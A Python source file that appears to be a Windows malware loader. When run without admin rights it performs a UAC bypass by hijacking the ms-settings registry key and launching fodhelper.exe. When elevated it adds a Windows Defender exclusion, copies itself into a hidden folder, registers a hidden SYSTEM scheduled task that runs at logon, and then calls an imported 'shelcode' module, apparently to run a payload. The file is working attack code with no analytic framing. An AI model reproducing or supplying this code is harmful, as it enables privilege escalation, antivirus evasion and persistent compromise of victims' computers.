import subprocess
import ctypes
import threading
import sys
import os
import shelcode

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_powershell_script_elevated():
    if is_admin():
        exe_file_path = os.path.abspath(sys.argv[0])
        exe_file_name = os.path.basename(exe_file_path)

        powershell = [
    "$directoryPath = Join-Path $HOME 'si'",
    "if ($directoryPath -eq '{exe_file_path}') {{ exit }}",
    "if (-not (Test-Path -Path $directoryPath)) {{New-Item -Path $directoryPath -ItemType Directory -Force}}",
    "Add-MpPreference -ExclusionPath $directoryPath",
    "Copy-Item -Path '{exe_file_path}' -Destination $directoryPath",
    "$outputFile = '{exe_file_path}'",
    "$taskName = 'User_Feed_ESRV'",
    "$taskPath = Join-Path $directoryPath \'{exe_file_name}\'",
    "schtasks /create /SC ONLOGON /TN $taskName /TR $taskPath /RU SYSTEM /RL HIGHEST /IT",
    "$taskFolder = '\'",
    "$objService = New-Object -ComObject 'Schedule.Service'",
    "$objService.Connect()",
    "$objRootFolder = $objService.GetFolder($taskFolder)",
    "$objTask = $objRootFolder.GetTask($taskName)",
    "$objTaskDefinition = $objTask.Definition",
    "$objTaskDefinition.Settings.StopIfGoingOnBatteries = $false",
    "$objTaskDefinition.Settings.DisallowStartIfOnBatteries = $false",
    "$objTaskDefinition.Settings.Hidden = $true",
    "$objTaskDefinition.Settings.StartWhenAvailable = $true",
    "$objTaskDefinition.Settings.Priority = 1",
    "$objRootFolder.RegisterTaskDefinition($taskName, $objTaskDefinition, 6, $null, $null, 0, $null)",
    "Start-Process -FilePath $outputFile -PassThru -WindowStyle Hidden -Verb RunAs"
]


        exe_file_path = os.path.abspath(sys.argv[0])
        exe_file_name = os.path.basename(exe_file_path)

        powershell_script = " ; ".join(powershell)

        powershell_script = powershell_script.format(
            exe_file_path=exe_file_path,
            exe_file_name=exe_file_name
        )

        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_script], shell=True)
#sh
        shelcode.O()
        #shh

    else:
        exe_file_path = os.path.abspath(sys.argv[0])
        
        powershell_command = f"""New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(Default)' -Value '{exe_file_path}'"""
        

        subprocess.run(["powershell.exe", "-v", "2", "-command", powershell_command], shell=True)
        subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "C:\\Windows\\System32\\fodhelper.exe"], shell=True)

        sys.exit(1)

def run_powershell_thread():
    run_powershell_script_elevated()

if __name__ == "__main__":
  
    powershell_thread = threading.Thread(target=run_powershell_thread)

    
    powershell_thread.start()

